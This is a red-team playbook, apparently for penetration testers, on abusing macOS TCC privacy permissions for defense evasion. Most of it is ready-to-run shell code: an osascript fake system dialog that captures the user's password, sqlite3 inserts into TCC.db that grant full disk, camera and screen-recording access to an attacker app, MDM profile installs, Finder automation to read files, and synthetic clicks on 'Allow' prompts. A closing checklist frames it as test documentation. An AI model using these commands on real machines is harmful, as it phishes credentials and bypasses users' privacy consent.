# TCC Manipulation for Defense Evasion

Manipulate TCC grants to gain access to protected resources or evade security controls.

**MITRE ATT&CK**: T1562.001 — Disable or Modify Tools

---

## 1. Social Engineering TCC Prompts

### Fake Permission Dialog (osascript)
```bash
# Phishing dialog that looks like a system prompt
osascript -e '
display dialog "macOS needs to verify your identity to update System Preferences." & return & return & "Enter your password to allow this." default answer "" with hidden answer buttons {"Cancel", "OK"} default button "OK" with icon caution with title "System Preferences"
' 2>/dev/null

# Capture the result
PASSWORD=$(osascript -e '
text returned of (display dialog "macOS requires your password to complete this action." default answer "" with hidden answer buttons {"Cancel", "OK"} default button "OK" with icon caution with title "Security & Privacy")
' 2>/dev/null)
echo "Captured: $PASSWORD"
```

### Prompt for Camera/Microphone Access
```bash
# When your app triggers a TCC prompt, users often click "Allow"
# Position the prompt when user is likely to approve
# (e.g., during a video call when camera access seems expected)

# AppleScript to request camera:
osascript -e 'tell application "FaceTime" to activate' 2>/dev/null
```

---

## 2. Direct TCC.db Modification

### Requirements
- SIP disabled, OR
- Full Disk Access, OR
- Root + ability to write to /Library/Application Support/com.apple.TCC/

### Grant FDA to an App
```bash
BUNDLE_ID="com.attacker.tool"
TIMESTAMP=$(date +%s)

# User TCC database
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" << EOF
INSERT OR REPLACE INTO access 
    (service, client, client_type, auth_value, auth_reason, auth_version, 
     indirect_object_identifier, indirect_object_identifier_type, flags, last_modified)
VALUES 
    ('kTCCServiceSystemPolicyAllFiles', '$BUNDLE_ID', 0, 2, 4, 1, 
     'UNUSED', 0, 0, $TIMESTAMP);
EOF

# Grant camera
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" << EOF
INSERT OR REPLACE INTO access 
    (service, client, client_type, auth_value, auth_reason, auth_version,
     indirect_object_identifier, indirect_object_identifier_type, flags, last_modified)
VALUES 
    ('kTCCServiceCamera', '$BUNDLE_ID', 0, 2, 4, 1,
     'UNUSED', 0, 0, $TIMESTAMP);
EOF

# Grant screen recording
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" << EOF
INSERT OR REPLACE INTO access 
    (service, client, client_type, auth_value, auth_reason, auth_version,
     indirect_object_identifier, indirect_object_identifier_type, flags, last_modified)
VALUES 
    ('kTCCServiceScreenCapture', '$BUNDLE_ID', 0, 2, 4, 1,
     'UNUSED', 0, 0, $TIMESTAMP);
EOF
```

### System TCC (requires root)
```bash
sudo sqlite3 "/Library/Application Support/com.apple.TCC/TCC.db" << EOF
INSERT OR REPLACE INTO access
    (service, client, client_type, auth_value, auth_reason, auth_version,
     indirect_object_identifier, indirect_object_identifier_type, flags, last_modified)
VALUES
    ('kTCCServiceSystemPolicyAllFiles', '$BUNDLE_ID', 0, 2, 4, 1,
     'UNUSED', 0, 0, $(date +%s));
EOF
```

---

## 3. MDM Profile TCC Grants

MDM can silently approve TCC access. If you can install a configuration profile:

```bash
# Install a profile that grants TCC (requires admin or MDM)
# See privilege-escalation/tcc_bypass.md for the profile template

# Manually install
sudo profiles install -path /path/to/tcc_profile.mobileconfig

# Check installed profiles
profiles list
```

---

## 4. AppleScript TCC Inheritance

When an app has Automation permission over another app, the controlled app's TCC grants are accessible.

```bash
# If Terminal has Automation permission to Finder:
osascript -e '
tell application "Finder"
    set desktopPath to (path to desktop folder) as text
    set fileList to every file of folder desktopPath
    repeat with f in fileList
        log (name of f)
    end repeat
end tell
'
# This reads Desktop contents through Finder's TCC grants,
# bypassing the user's own Desktop access TCC
```

---

## 5. Synthetic Events (Accessibility Abuse)

With Accessibility TCC grant, programmatically click "Allow" on any TCC prompt.

```bash
# Python with pyautogui or appscript
python3 << 'EOF'
import subprocess, time

# Trigger an action that causes a TCC prompt
subprocess.Popen(["open", "-a", "Photo Booth"])

# Wait for the prompt
time.sleep(2)

# Click "Allow" via AppleScript (requires Accessibility TCC)
subprocess.run([
    "osascript", "-e",
    'tell application "System Events" to click button "OK" of window 1 of process "UserNotificationCenter"'
])
EOF
```

---

## 6. Disable TCC Enforcement

```bash
# Reset TCC database for a specific app (user consents again)
tccutil reset All com.target.app

# Reset all TCC grants for a service
tccutil reset Camera
tccutil reset Microphone
tccutil reset ScreenCapture
tccutil reset SystemPolicyAllFiles
tccutil reset Accessibility

# Reset everything (nuclear)
tccutil reset All
```

---

## What to Document

- Method used for TCC manipulation
- SIP status at time of test
- Which TCC grants were obtained
- Whether manipulation survived reboot
- Impact: what data was accessed via the TCC bypass
